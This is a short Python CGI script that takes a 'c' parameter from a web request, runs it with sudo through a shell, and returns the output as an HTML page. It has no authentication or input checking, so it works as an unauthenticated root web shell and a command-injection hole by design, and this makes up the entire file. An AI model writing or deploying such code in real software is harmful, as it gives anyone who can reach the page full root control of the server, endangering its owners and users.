#! /usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

data = cgi.FieldStorage()

x = data.getvalue("c")


o = subprocess.getoutput("sudo " + x)

print("Command : ",x)

print("<br />")
print("<br />")

print("-----------------------------")
print("<br />")
print("<br />")

print("Output is:",o)
